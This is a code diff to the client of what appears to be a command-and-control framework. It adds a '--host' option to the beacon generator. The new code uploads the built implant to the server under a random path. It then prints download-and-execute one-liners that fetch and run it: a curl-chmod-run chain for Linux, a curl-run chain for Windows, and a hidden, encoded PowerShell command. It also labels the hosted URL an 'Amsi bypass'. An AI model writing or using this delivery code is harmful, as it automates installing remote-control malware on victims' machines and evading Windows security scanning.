@@ -60,6 +60,7 @@ func SetGenerateBeaconCommand(conn grpc.ClientConnInterface) {
 		},
 		Flags: func(f *grumble.Flags) {
 			f.Bool("n", "no-console", false, "If Specified, beacon will not have a console on windows")
+			f.Bool("s", "host", false, "Host file and return a command to download and execute")
 			f.String("t", "http-proxy-type", "none", "HTTP Proxy Type, can be HTTP or HTTPS")
 			f.String("a", "http-proxy-address", "", "URL for example 127.0.0.1:8080")
 			f.String("u", "http-proxy-username", "", "Proxy Username")
@@ -75,6 +76,7 @@ func SetGenerateBeaconCommand(conn grpc.ClientConnInterface) {
 				"--http-proxy-username",
 				"--http-proxy-password",
 				"--no-console",
+				"--host",
 			}
 
 			// complete flags
@@ -213,8 +215,65 @@ func SetGenerateBeaconCommand(conn grpc.ClientConnInterface) {
 				fmt.Println("Build failed:", err)
 			}
 
-			fmt.Println("Beacon Generated")
+			beaconName := "main_"+beaconType
+			if beaconOs == "windows" {
+				beaconName += ".exe"
+			}
+			fmt.Println(fmt.Sprintf("[+] Beacon Generated at %s", beaconName))
 
+			host := c.Flags.Bool("host")
+			if !host {
+				return nil
+			}
+
+			randomPathName, err := randomName(6)
+			if err != nil {
+				fmt.Println("Error random name", err)
+			}
+			beaconByte, err := os.ReadFile(beaconName)
+			if err != nil {
+				fmt.Println("Error Occured ", err.Error())
+				return nil
+			}
+			err = clientrpc.HostFileFunc(conn, randomPathName + "/" + beaconName, beaconByte)
+			if err != nil {
+				fmt.Println("Error hosting file ", err.Error())
+			}
+
+
+			hlist,err  := clientrpc.ViewHostFileFunc(conn)
+			if err != nil {
+				fmt.Println("Error listing hosted file ", err.Error())
+			}
+			var beaconPath string
+			for i := 0; i < len(hlist.GetHostlist()); i++ {
+				hpath := hlist.GetHostlist()[i].Filename
+				if strings.Contains(hpath, randomPathName) {
+					beaconPath = hpath
+					break
+				}
+			}
+			if beaconPath == "" {
+				fmt.Println("Error Occured, loader path not found")
+				return nil
+			}
+
+			fmt.Println(fmt.Sprintf("Amsi bypass at %s://%s:%s%s", beaconType, beaconIP, beaconPort, beaconPath))
+			
+
+			fmt.Println("[+] Use the following payloads to download and run beacon")
+			beaconURL := fmt.Sprintf("%s://%s:%s%s", beaconType, beaconIP, beaconPort, beaconPath)
+
+			if beaconOs == "linux" {
+				fmt.Println(fmt.Sprintf("curl %s -o /tmp/rudeus; chmod +x /tmp/rudeus; /tmp/rudeus", beaconURL))
+				return nil
+			}
+
+			curlString := fmt.Sprintf("mkdir /temp; curl %s -o /temp/rudeus.exe; /temp/rudeus.exe", beaconURL)
+			fmt.Println(curlString)
+
+			curlStringB64 := utf16LEBase64(curlString)
+			fmt.Println("powershell -nop -w hidden -e", curlStringB64)
 			return nil
 		},
 	}
@@ -422,7 +481,7 @@ func SetGenerateBeaconCommand(conn grpc.ClientConnInterface) {
 			fmt.Println(pwshWebDelivery)
 
 			pwshWebDeliveryB64 := utf16LEBase64(pwshWebDelivery)
-			fmt.Println("powershell -nop -w hidden -e ", pwshWebDeliveryB64)
+			fmt.Println("powershell -nop -w hidden -e", pwshWebDeliveryB64)
 			return nil
 		},
 	}
